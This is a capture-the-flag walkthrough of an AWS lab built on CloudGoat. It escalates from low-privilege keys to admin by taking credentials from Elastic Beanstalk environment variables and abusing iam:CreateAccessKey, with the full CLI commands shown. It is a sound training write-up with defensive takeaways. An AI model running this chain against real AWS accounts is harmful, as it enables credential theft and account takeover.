Hack Smarter · Easy · AWS / cloud

A pure AWS IAM box — no VPN, no shells, just the CLI. You start with low-priv keys and finish reading a flag out of Secrets Manager. The chain: low-priv keys -> Beanstalk config leaks a second credential in environment variables -> that user can't read secrets either, but its policy document reveals iam:CreateAccessKey on * -> mint keys for the admin user -> read the secret. Two deliberate red herrings sit in the middle to force you to actually read the IAM policies.

AWS keys below are redacted — that's Hack Smarter's one hard rule for cloud walkthroughs. Everything else is the intended path.

$ setup

The lab hands you an access key + secret (built on CloudGoat). Wire up a named profile so you don't clobber anything, and always test the objective first — sometimes low-priv is looser than intended: 

aws configure --profile bean       # keys, region us-east-1, json
aws sts get-caller-identity --profile bean
# Arn: arn:aws:iam::724440692272:user/lab_low_priv_user

aws secretsmanager list-secrets --profile bean --region us-east-1
# AccessDeniedException: not authorized to perform secretsmanager:ListSecrets

Denied, as the username suggests. So we pivot.

$ beanstalk as a credential store

Enumerate the environment, then dump its configuration — Elastic Beanstalk keeps environment variables in config, and that's a notorious dumping ground for hardcoded secrets: 

aws elasticbeanstalk describe-environments --profile bean --region us-east-1
# ApplicationName: lab-app   EnvironmentName: lab-env

aws elasticbeanstalk describe-configuration-settings \
  --application-name lab-app --environment-name lab-env \
  --profile bean --region us-east-1 \
  --query "ConfigurationSettings[].OptionSettings[?Namespace=='aws:elasticbeanstalk:application:environment']"

Out fall a second set of credentials: 

SECONDARY_ACCESS_KEY : <REDACTED>
SECONDARY_SECRET_KEY : <REDACTED>

$ the red herrings

Load the secondary user and try the objective again — still denied, and so is every obvious way around it: 

aws configure --profile bean2      # SECONDARY_* keys
aws sts get-caller-identity --profile bean2
# Arn: .../user/lab_secondary_user

aws secretsmanager list-secrets --profile bean2 --region us-east-1
# AccessDeniedException   (still no ListSecrets)
# get-secret-value on guessed names -> AccessDenied
# resourcegroupstaggingapi get-resources -> AccessDenied (tag:GetResources)

Dead end — if you only think in terms of Secrets Manager. But one call works: 

aws iam list-attached-user-policies --user-name lab_secondary_user --profile bean2
# PolicyName: lab_secondary_policy

$ read the policy — the actual technique

When List is blocked but you have IAM read, the policy document is the map. Read it: 

aws iam get-policy-version \
  --policy-arn arn:aws:iam::724440692272:policy/lab_secondary_policy \
  --version-id v1 --profile bean2
{
  "Statement": [
    { "Action": ["iam:CreateAccessKey"], "Effect": "Allow", "Resource": "*" },
    { "Action": ["iam:ListUsers","iam:GetUser","iam:GetPolicyVersion","..."],
      "Effect": "Allow", "Resource": "*" }
  ]
}

No Secrets Manager access at all — that was the second red herring. What we do have is the important part: iam:CreateAccessKey on Resource: "*". That means this user can mint API keys for any IAM user in the account — including one that can read the secret. (This is the CloudGoat iam_privesc_by_key_rotation family.)

$ find the target, forge keys

aws iam list-users --profile bean2
# lab_admin_user, lab_low_priv_user, lab_secondary_user

aws iam get-policy-version \
  --policy-arn arn:aws:iam::724440692272:policy/lab_admin_user_policy \
  --version-id v1 --profile bean2
# { "Action": "*", "Effect": "Allow", "Resource": "*" }   <- full admin

lab_admin_user is full admin. Mint a fresh access key for it — the privesc payoff: 

aws iam create-access-key --user-name lab_admin_user --profile bean2
# AccessKeyId: <REDACTED>   SecretAccessKey: <REDACTED>   Status: Active
An IAM user can hold only two access keys. If this returns LimitExceeded, list-access-keys and delete a stale one first. And freshly minted keys take a few seconds to propagate — if get-caller-identity returns InvalidClientTokenId, wait ~10s and retry.

$ flag

aws configure --profile admin      # forged admin keys
aws secretsmanager list-secrets --profile admin --region us-east-1 --query "SecretList[].Name"
# [ "lab_final_flag" ]

aws secretsmanager get-secret-value --secret-id lab_final_flag \
  --profile admin --region us-east-1 --query SecretString --output text
# FLAG{D0nt_st0r3_s3cr3ts_in_b3@nsta1k!}

The flag itself spells out the moral: don't store secrets in Beanstalk environment variables. Any principal who can read the environment config walks the entire chain.

$ takeaway

  • Anything that holds environment variables is a credential store — Beanstalk, Lambda, ECS task definitions, CI config. Dump env before anything fancier.
  • When List* is denied but you have IAM read, enumerate permissions, not resources. Policy documents name the exact resources a principal can touch — they're how you escape “I can read it but I can't find it.”
  • iam:CreateAccessKey on * is a full privilege-escalation primitive, not a benign admin action. If a low-value user has it, they can become any user in the account. Scope it to Resource: <self> in the real world.
